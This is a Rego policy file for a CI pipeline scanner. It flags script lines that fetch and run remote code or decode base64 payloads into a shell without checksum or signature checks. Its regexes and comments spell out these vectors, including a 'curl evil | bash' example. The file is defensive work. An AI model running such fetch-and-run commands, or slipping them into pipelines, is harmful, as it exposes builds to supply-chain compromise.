# unverified-scripts — flag pipeline scripts that download or inline
# executable content without integrity verification. Classic vectors
# include `curl ... | bash`, download-then-exec, redirect-to-file-then-
# exec, Megalodon-style `echo "..." | base64 -d | bash`, and any
# command piped into a shell without verification.
#
# False-positive guards: the pattern check operates on the line with
# quoted substrings stripped, so a `| bash` that sits inside a string
# literal (an `echo` of installation instructions, a comment in a
# heredoc body) does not trigger. The heredoc-marker skip is scoped
# to the generic `| <shell>` pattern only, so a heredoc marker on the
# same line as a curl/wget/base64 download (`curl evil | bash <<EOF`)
# does NOT shield it from detection — the operator-intent argument
# only holds when the line itself isn't fetching external content.
#
# Lines that include a checksum / signature verification command on
# the same line (sha256sum, shasum, gpg --verify, cosign verify, …)
# are treated as intentionally verified and skipped.
package unverified_scripts

import rego.v1

# Shell interpreters commonly used as pipe targets in CI attacks.
_shell := `bash|sh|zsh|python[23]?|perl|ruby|dash|ksh`

deny contains finding if {
	some i, j
	job := input.pipeline.jobs[i]
	line := job.scripts[j]
	visible := _visible_line(line)
	_unsafe_script_line(visible, line)
	# Verification keyword check runs on the stripped line so an
	# attacker can't bypass the rule by putting `sha256sum` /
	# `cosign verify` inside a quoted string ("must sha256sum first").
	# The trust-URL check stays on the raw line because URLs are often
	# legitimately quoted in shell commands.
	not _line_is_verified(visible)
	not _line_is_trusted(line)
	finding := {
		"code":       "ISSUE-411",
		"severity":   "high",
		"message":    sprintf("Job '%s' script: %s", [job.name, trim_space(line)]),
		"job":        job.name,
		"scriptLine": line,
	}
}

# Strip quoted substrings (double then single quotes) so a pipe-to-
# shell that sits entirely inside a string literal does not match.
_visible_line(line) := stripped if {
	once := regex.replace(line, `"[^"]*"`, "")
	stripped := regex.replace(once, `'[^']*'`, "")
}

# Heredoc on the same line — `cat <<EOF | bash`, `<<-EOF`, `<<'EOF'`,
# `<< "EOF"`. The pipe target is operator-authored, in-tree content,
# not an externally-sourced payload; any unsafe download inside the
# body still fires on its own script line.
_has_heredoc(line) if {
	regex.match(`<<-?\s*['"]?\w+`, line)
}

# Patterns 1–4 fetch external content on the same line as the pipe,
# so a heredoc marker on the line does not shield them: an attacker
# putting `curl evil | bash <<EOF` is still doing a remote pipe-to-
# shell, the heredoc is just camouflage.

# curl|wget piped directly into a shell (classic supply-chain vector).
_unsafe_script_line(visible, _) if {
	regex.match(sprintf(`(?i)(curl|wget)\s+[^|&;\n]*\|\s*(sudo\s+)?(%s)\b`, [_shell]), visible)
}

# Download then execute on the same line (curl -o … && bash, etc.).
_unsafe_script_line(visible, _) if {
	regex.match(sprintf(`(?i)(curl|wget)\s+[^&;\n]*&&\s*(sudo\s+)?(%s)\b`, [_shell]), visible)
}

# Download to a file then execute (; or &&).
_unsafe_script_line(visible, _) if {
	regex.match(sprintf(`(?i)(curl|wget)\s+[^;\n]*(?:>\s*\S+|-o\s+\S+)[^;\n]*(?:;|&&)\s*(sudo\s+)?(%s)\b`, [_shell]), visible)
}

# Inline obfuscated payload (Megalodon: echo "…" | base64 -d | bash).
# The base64 blob gets stripped along with its quotes, but `echo  |
# base64 -d | bash` still matches because the rest of the chain is on
# the visible side of the quotes.
_unsafe_script_line(visible, _) if {
	regex.match(sprintf(`(?i)(echo|printf)\s+[^|]*\|\s*base64\s+(-d|--decode)\s*\|\s*(sudo\s+)?(%s)\b`, [_shell]), visible)
}

# Generic `<anything> | <shell>` catch-all. Skipped on heredoc-marker
# lines because `cat <<EOF | bash` is in-tree operator-authored content
# — but only when the line isn't ALSO matching one of the more specific
# patterns above (those run regardless of heredoc presence).
_unsafe_script_line(visible, line) if {
	not _has_heredoc(line)
	regex.match(sprintf(`(?i)\|\s*(sudo\s+)?(%s)\b`, [_shell]), visible)
}

_line_is_verified(line) if {
	regex.match(`(?i)(sha256sum|sha512sum|sha1sum|shasum|gpg\s+--verify|cosign\s+verify)`, line)
}

# A line is trusted when it references at least one URL whose host
# (and optional path prefix) matches a user-configured glob in
# pipelineMustNotExecuteUnverifiedScripts.trustedUrls. Mirrors the
# legacy isTrusted helper: extract every http(s) URL on the line and
# allow the line as soon as any of them matches a trusted pattern.
_line_is_trusted(line) if {
	some pattern in input.config.unverifiedScripts.trustedUrls
	url := regex.find_n(`https?://[^\s|;)'"]+`, line, -1)[_]
	glob.match(pattern, null, url)
}

# Bare-hostname URLs (no scheme) are common in curl/wget commands such as
# `curl -sL firebase.tools | bash`. Normalise them to https:// so patterns
# like "https://firebase.tools" and "https://firebase.tools/*" match.
_line_is_trusted(line) if {
	some pattern in input.config.unverifiedScripts.trustedUrls
	bare := regex.find_n(`\b[a-zA-Z0-9][a-zA-Z0-9-]*(?:\.[a-zA-Z0-9][a-zA-Z0-9-]+)+(?:/[^\s|;)'"]*)?`, line, -1)[_]
	not startswith(bare, "http")
	glob.match(pattern, null, concat("", ["https://", bare]))
}

# Also try matching bare-hostname tokens directly against the pattern so that
# patterns without a scheme ("firebase.tools", "firebase.tools/*") also work.
_line_is_trusted(line) if {
	some pattern in input.config.unverifiedScripts.trustedUrls
	bare := regex.find_n(`\b[a-zA-Z0-9][a-zA-Z0-9-]*(?:\.[a-zA-Z0-9][a-zA-Z0-9-]+)+(?:/[^\s|;)'"]*)?`, line, -1)[_]
	not startswith(bare, "http")
	glob.match(pattern, null, bare)
}
